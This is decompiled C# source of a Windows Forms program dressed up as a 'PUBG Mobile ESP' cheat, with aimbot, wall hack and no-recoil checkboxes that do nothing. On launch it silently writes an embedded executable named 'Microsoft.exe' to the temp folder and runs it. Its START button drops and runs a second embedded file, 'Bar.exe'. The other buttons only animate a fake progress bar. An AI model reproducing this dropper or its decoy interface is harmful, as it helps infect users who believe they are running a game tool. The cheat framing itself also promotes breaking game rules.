using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using PUBG.My;
using PUBG.My.Resources;

namespace PUBG;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button1_Click;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox1")]
	internal virtual CheckBox CheckBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox2")]
	internal virtual CheckBox CheckBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox3")]
	internal virtual CheckBox CheckBox3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox4")]
	internal virtual CheckBox CheckBox4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckBox5")]
	internal virtual CheckBox CheckBox5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button2_Click;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("CheckBox6")]
	internal virtual CheckBox CheckBox6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Button3_Click;
			Button button = _Button3;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string temp = default(string);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 208:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0021;
						case 4:
							goto IL_0030;
						case 5:
							goto IL_003e;
						case 6:
							goto IL_0048;
						case 7:
							goto IL_0056;
						case 8:
							goto IL_0065;
						case 9:
							goto IL_0073;
						case 10:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 11:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0073:
					num = 9;
					ProgressBar1.set_Maximum(100);
					break;
					IL_0065:
					num = 8;
					ProgressBar1.set_Value(0);
					goto IL_0073;
					IL_000a:
					num = 2;
					temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
					goto IL_0021;
					IL_0021:
					num = 3;
					text = temp + "Microsoft.exe";
					goto IL_0030;
					IL_0030:
					num = 4;
					File.WriteAllBytes(text, Resources.Microsoft);
					goto IL_003e;
					IL_003e:
					num = 5;
					Process.Start(text);
					goto IL_0048;
					IL_0048:
					num = 6;
					Timer1.set_Enabled(false);
					goto IL_0056;
					IL_0056:
					num = 7;
					Timer1.set_Interval(100);
					goto IL_0065;
					end_IL_0001_2:
					break;
				}
				num = 10;
				ProgressBar1.set_Step(1);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 208;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		ProgressBar1.set_Value(0);
		Timer1.Start();
		((Control)Button1).set_Enabled(false);
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		ProgressBar progressBar;
		(progressBar = ProgressBar1).set_Value(checked(progressBar.get_Value() + 1));
		if (ProgressBar1.get_Value() == 100)
		{
			Timer1.Stop();
			((Control)Button1).set_Enabled(true);
			MessageBox.Show("DONE");
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		ProgressBar1.set_Value(0);
		Timer1.Start();
		((Control)Button1).set_Enabled(false);
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		string temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
		string text = temp + "Bar.exe";
		File.WriteAllBytes(text, Resources.Bar);
		Process.Start(text);
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Expected O, but got Unknown
		//IL_0259: Unknown result type (might be due to invalid IL or missing references)
		//IL_0263: Expected O, but got Unknown
		//IL_02ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0309: Expected O, but got Unknown
		//IL_03b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bb: Expected O, but got Unknown
		//IL_044b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0455: Expected O, but got Unknown
		//IL_04f4: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fe: Expected O, but got Unknown
		//IL_059d: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a7: Expected O, but got Unknown
		//IL_0630: Unknown result type (might be due to invalid IL or missing references)
		//IL_063a: Expected O, but got Unknown
		//IL_06da: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e4: Expected O, but got Unknown
		//IL_0793: Unknown result type (might be due to invalid IL or missing references)
		//IL_079d: Expected O, but got Unknown
		//IL_0847: Unknown result type (might be due to invalid IL or missing references)
		//IL_0851: Expected O, but got Unknown
		//IL_094c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0956: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Button1 = new Button();
		Label1 = new Label();
		ProgressBar1 = new ProgressBar();
		Label2 = new Label();
		CheckBox1 = new CheckBox();
		CheckBox2 = new CheckBox();
		CheckBox3 = new CheckBox();
		CheckBox4 = new CheckBox();
		CheckBox5 = new CheckBox();
		Button2 = new Button();
		CheckBox6 = new CheckBox();
		Button3 = new Button();
		Timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)Button1).set_Cursor(Cursors.get_Hand());
		((Control)Button1).set_Font(new Font("Abel", 12f, (FontStyle)1));
		((Control)Button1).set_Location(new Point(12, 256));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(107, 34));
		((Control)Button1).set_TabIndex(0);
		((ButtonBase)Button1).set_Text("UPDATE");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Poppins", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_Location(new Point(1, 10));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(310, 25));
		((Control)Label1).set_TabIndex(2);
		Label1.set_Text("CRNGameloop v1.4 PUBG Mobile ESP");
		Label1.set_TextAlign((ContentAlignment)32);
		((Control)ProgressBar1).set_Location(new Point(12, 305));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(286, 29));
		((Control)ProgressBar1).set_TabIndex(3);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Poppins", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_Location(new Point(87, 33));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(121, 21));
		((Control)Label2).set_TabIndex(2);
		Label2.set_Text("+ Aimbot Hack");
		Label2.set_TextAlign((ContentAlignment)32);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		((ButtonBase)CheckBox1).set_BackColor(Color.Gold);
		((ButtonBase)CheckBox1).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox1).set_Font(new Font("Poppins", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)CheckBox1).set_Location(new Point(12, 164));
		((Control)CheckBox1).set_Name("CheckBox1");
		((Control)CheckBox1).set_Size(new Size(101, 23));
		((Control)CheckBox1).set_TabIndex(4);
		((ButtonBase)CheckBox1).set_Text("WALL HACK");
		((ButtonBase)CheckBox1).set_TextImageRelation((TextImageRelation)2);
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(false);
		((ButtonBase)CheckBox2).set_AutoSize(true);
		((ButtonBase)CheckBox2).set_BackColor(Color.Gold);
		((ButtonBase)CheckBox2).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox2).set_Font(new Font("Poppins", 9f, (FontStyle)1));
		((Control)CheckBox2).set_Location(new Point(12, 187));
		((Control)CheckBox2).set_Name("CheckBox2");
		((Control)CheckBox2).set_Size(new Size(81, 23));
		((Control)CheckBox2).set_TabIndex(5);
		((ButtonBase)CheckBox2).set_Text("AIM BOT");
		((ButtonBase)CheckBox2).set_UseVisualStyleBackColor(false);
		((ButtonBase)CheckBox3).set_AutoSize(true);
		((ButtonBase)CheckBox3).set_BackColor(Color.Gold);
		((Control)CheckBox3).set_Font(new Font("Poppins", 9f, (FontStyle)1));
		((Control)CheckBox3).set_Location(new Point(206, 164));
		((Control)CheckBox3).set_Name("CheckBox3");
		((Control)CheckBox3).set_Size(new Size(95, 23));
		((Control)CheckBox3).set_TabIndex(6);
		((ButtonBase)CheckBox3).set_Text("BAN SCAN");
		((ButtonBase)CheckBox3).set_UseVisualStyleBackColor(false);
		((ButtonBase)CheckBox4).set_AutoSize(true);
		((ButtonBase)CheckBox4).set_BackColor(Color.Gold);
		((ButtonBase)CheckBox4).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox4).set_Font(new Font("Poppins", 9f, (FontStyle)1));
		((Control)CheckBox4).set_Location(new Point(206, 187));
		((Control)CheckBox4).set_Name("CheckBox4");
		((Control)CheckBox4).set_Size(new Size(95, 23));
		((Control)CheckBox4).set_TabIndex(7);
		((ButtonBase)CheckBox4).set_Text("NO RECOIL");
		((ButtonBase)CheckBox4).set_UseVisualStyleBackColor(false);
		((ButtonBase)CheckBox5).set_AutoSize(true);
		((ButtonBase)CheckBox5).set_BackColor(Color.Gold);
		((ButtonBase)CheckBox5).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox5).set_Font(new Font("Poppins", 9f, (FontStyle)1));
		((Control)CheckBox5).set_Location(new Point(206, 210));
		((Control)CheckBox5).set_Name("CheckBox5");
		((Control)CheckBox5).set_Size(new Size(107, 23));
		((Control)CheckBox5).set_TabIndex(8);
		((ButtonBase)CheckBox5).set_Text("SUPER JUMP");
		((ButtonBase)CheckBox5).set_UseVisualStyleBackColor(false);
		((Control)Button2).set_Cursor(Cursors.get_Hand());
		((Control)Button2).set_Font(new Font("Abel", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button2).set_Location(new Point(191, 256));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(107, 34));
		((Control)Button2).set_TabIndex(9);
		((ButtonBase)Button2).set_Text("LOAD FILES");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((ButtonBase)CheckBox6).set_AutoSize(true);
		((ButtonBase)CheckBox6).set_BackColor(Color.Gold);
		((ButtonBase)CheckBox6).set_FlatStyle((FlatStyle)1);
		((Control)CheckBox6).set_Font(new Font("Poppins", 9f, (FontStyle)1));
		((Control)CheckBox6).set_Location(new Point(12, 210));
		((Control)CheckBox6).set_Name("CheckBox6");
		((Control)CheckBox6).set_Size(new Size(97, 23));
		((Control)CheckBox6).set_TabIndex(10);
		((ButtonBase)CheckBox6).set_Text("GOD MDOE");
		((ButtonBase)CheckBox6).set_UseVisualStyleBackColor(false);
		((ButtonBase)Button3).set_BackColor(Color.LightGray);
		((Control)Button3).set_Cursor(Cursors.get_Hand());
		Button3.set_DialogResult((DialogResult)1);
		((ButtonBase)Button3).set_FlatStyle((FlatStyle)1);
		((Control)Button3).set_Font(new Font("Ethnocentric Rg", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Button3).set_ForeColor(Color.Black);
		((Control)Button3).set_Location(new Point(68, 340));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(184, 34));
		((Control)Button3).set_TabIndex(11);
		((ButtonBase)Button3).set_Text("START");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ActiveCaption);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(315, 390));
		((Control)this).get_Controls().Add((Control)(object)Button3);
		((Control)this).get_Controls().Add((Control)(object)CheckBox6);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox5);
		((Control)this).get_Controls().Add((Control)(object)CheckBox4);
		((Control)this).get_Controls().Add((Control)(object)CheckBox3);
		((Control)this).get_Controls().Add((Control)(object)CheckBox2);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)2);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("PUBG CRNGameloop");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
